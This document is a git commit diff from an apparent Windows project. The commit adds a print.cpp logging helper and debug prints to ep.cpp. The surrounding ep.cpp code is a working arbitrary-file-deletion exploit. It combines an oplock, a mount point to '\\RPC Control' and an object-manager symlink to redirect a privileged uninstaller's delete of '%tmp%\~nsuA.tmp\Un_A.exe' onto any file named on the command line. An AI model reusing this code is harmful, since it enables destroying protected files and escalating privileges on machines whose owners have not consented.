49020894a0bd2d4ef3fb7940f762b8c460412bd1
rbmm <_dm_sh_@tutanota.com>
2025-07-29 22:20:30 +0300

    *

--- DF/ep.cpp
+++ DF/ep.cpp
@@ -2,6 +2,8 @@
 
 _NT_BEGIN
 
+#include "print.h"
+
 NTSTATUS CreateMountPoint(POBJECT_ATTRIBUTES poa, PCWSTR SubstituteName, PCWSTR PrintName)
 {
 	NTSTATUS status = STATUS_INTERNAL_ERROR;
@@ -63,6 +65,8 @@ VOID NTAPI OnApc(
 
 NTSTATUS Delete2(PCWSTR pszSrcFile, PCWSTR pszTargetFile)
 {
+	DbgPrint("[\"%ws\", \"%ws\"]\r\n", pszSrcFile, pszTargetFile);
+
 	NTSTATUS status;
 	UNICODE_STRING ObjectName, TargetName;
 	PWSTR pszFileName;
@@ -73,19 +77,30 @@ NTSTATUS Delete2(PCWSTR pszSrcFile, PCWSTR pszTargetFile)
 	{
 		OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &TargetName };
 
-		if (0 <= (status = NtOpenFile(&hFile, SYNCHRONIZE, &oa, &iosb, FILE_SHARE_VALID_FLAGS, 0)))
+		status = NtOpenFile(&hFile, SYNCHRONIZE, &oa, &iosb, FILE_SHARE_VALID_FLAGS, 0);
+
+		DbgPrint("Open(%wZ)=%x\r\n", &TargetName, status);
+
+		if (0 <= status)
 		{
 			BOOL b = FALSE;
 
-			if (STATUS_PENDING == (status = NtFsControlFile(hFile, 0,
-				OnApc, &b, &iosb, FSCTL_REQUEST_OPLOCK_LEVEL_1, 0, 0, 0, 0)))
+			status = NtFsControlFile(hFile, 0, OnApc, &b, &iosb, FSCTL_REQUEST_OPLOCK_LEVEL_1, 0, 0, 0, 0);
+
+			DbgPrint("FSCTL_REQUEST_OPLOCK_LEVEL_1 = %x\r\n", status);
+
+			if (STATUS_PENDING == status)
 			{
 				if (0 <= (status = RtlDosPathNameToNtPathName_U_WithStatus(pszSrcFile, &ObjectName, &pszFileName, 0)))
 				{
 					pszFileName[-1] = 0;
 					RtlInitUnicodeString(oa.ObjectName = &ObjectName, ObjectName.Buffer);
 
-					if (0 <= (status = CreateMountPoint(&oa, L"\\RPC Control", L"")))
+					status = CreateMountPoint(&oa, L"\\RPC Control", L"");
+
+					DbgPrint("CreateMountPoint(%wZ)=%x\r\n", &ObjectName, status);
+
+					if (0 <= status)
 					{
 						status = STATUS_INTERNAL_ERROR;
 
@@ -97,12 +112,18 @@ NTSTATUS Delete2(PCWSTR pszSrcFile, PCWSTR pszTargetFile)
 							{
 								HANDLE hSymLink;
 
-								if (0 <= (status = CreateSymLink(&hSymLink, psz, &TargetName)))
+								status = CreateSymLink(&hSymLink, psz, &TargetName);
+
+								DbgPrint("CreateSymLink(%ws -> %wZ)=%x\r\n", psz, &TargetName, status);
+
+								if (0 <= status)
 								{
 									while (!b)
 									{
 										SleepEx(INFINITE, TRUE);
 									}
+
+									DbgPrint("FSCTL_REQUEST_OPLOCK_LEVEL_1 = [%x, %p]\r\n", iosb.Status, iosb.Information);
 
 									NtClose(hSymLink);
 								}
@@ -156,14 +177,23 @@ NTSTATUS Delete2Ex(PCWSTR pszSrcFile, PCWSTR pszTargetFile)
 
 void WINAPI ep(void*)
 {
+	PrintInfo pi;
+	InitPrintf();
+
+	DbgPrint("cmd: \"%ws\"\r\n", GetCommandLineW());
+
+	NTSTATUS status = STATUS_INVALID_PARAMETER;
+
 	if (PWSTR pa = wcschr(GetCommandLineW(), '*'))
 	{
 		if (PWSTR pb = wcschr(++pa, '*'))
 		{
 			*pb = 0;
-			Delete2Ex(L"%tmp%\\~nsuA.tmp\\Un_A.exe", pa);
+			status = Delete2Ex(L"%tmp%\\~nsuA.tmp\\Un_A.exe", pa);
 		}
 	}
+
+	PrintError(status);
 
 	ExitProcess(0);
 }
---
+++ DF/print.cpp
@@ -0,0 +1,135 @@
+#include "stdafx.h"
+
+_NT_BEGIN
+
+#include "print.h"
+
+void PutChars(PCWSTR pwz, ULONG cch)
+{
+	if (PrintInfo* ppi = PrintInfo::get())
+	{
+		PSTR buf = 0;
+		ULONG len = 0;
+		while (len = WideCharToMultiByte(ppi->_G_CodePage, 0, pwz, cch, buf, len, 0, 0))
+		{
+			if (buf)
+			{
+				break;
+			}
+
+			if (!(buf = (PSTR)_malloca(len)))
+			{
+				break;
+			}
+		}
+
+		if (IsDebuggerPresent())
+		{
+			ULONG_PTR params[] = { cch, (ULONG_PTR)pwz, len, (ULONG_PTR)buf };
+			RaiseException(DBG_PRINTEXCEPTION_WIDE_C, 0, _countof(params), params);
+		}
+
+		if (ppi->_G_hFile)
+		{
+			if (ppi->_G_bConsole)
+			{
+				WriteConsoleW(ppi->_G_hFile, pwz, cch, &cch, 0);
+			}
+			else
+			{
+				WriteFile(ppi->_G_hFile, buf, len, &len, 0);
+
+			}
+		}
+
+		if (buf)
+		{
+			_freea(buf);
+		}
+	}
+}
+
+void PrintWA_v(PCWSTR format, ...)
+{
+	va_list ap;
+	va_start(ap, format);
+
+	PWSTR buf = 0;
+	int len = 0;
+	while (0 < (len = _vsnwprintf(buf, len, format, ap)))
+	{
+		if (buf)
+		{
+			PutChars(buf, len);
+			break;
+		}
+
+		++len;
+		if (!(buf = (PWSTR)_malloca(len * sizeof(WCHAR))))
+		{
+			break;
+		}
+	}
+
+	if (buf)
+	{
+		_freea(buf);
+	}
+
+	va_end(ap);
+}
+
+HRESULT PrintError(HRESULT dwError)
+{
+	LPCVOID lpSource = 0;
+	ULONG dwFlags = FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS;
+
+	if ((dwError & FACILITY_NT_BIT) || (0 > dwError && HRESULT_FACILITY(dwError) == FACILITY_NULL))
+	{
+		dwError &= ~FACILITY_NT_BIT;
+__nt:
+		dwFlags = FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS;
+
+		lpSource = GetModuleHandle(L"ntdll");
+	}
+
+	PWSTR lpText;
+	if (ULONG cch = FormatMessageW(dwFlags, lpSource, dwError, 0, (PWSTR)&lpText, 0, 0))
+	{
+		PutChars(lpText, cch);
+		LocalFree(lpText);
+	}
+	else if (dwFlags & FORMAT_MESSAGE_FROM_SYSTEM)
+	{
+		goto __nt;
+	}
+
+	return dwError;
+}
+
+void InitPrintf()
+{
+	if (PrintInfo* ppi = PrintInfo::get())
+	{
+		ppi->_G_CodePage = GetConsoleOutputCP();
+		ppi->_G_hFile = 0;
+
+		if (HANDLE hFile = GetStdHandle(STD_OUTPUT_HANDLE))
+		{
+			ppi->_G_hFile = hFile;
+			FILE_FS_DEVICE_INFORMATION ffdi;
+			IO_STATUS_BLOCK iosb;
+			if (0 <= NtQueryVolumeInformationFile(hFile, &iosb, &ffdi, sizeof(ffdi), FileFsDeviceInformation))
+			{
+				switch (ffdi.DeviceType)
+				{
+				case FILE_DEVICE_CONSOLE:
+					ppi->_G_bConsole = TRUE;
+					break;
+				}
+			}
+		}
+	}
+}
+
+_NT_END
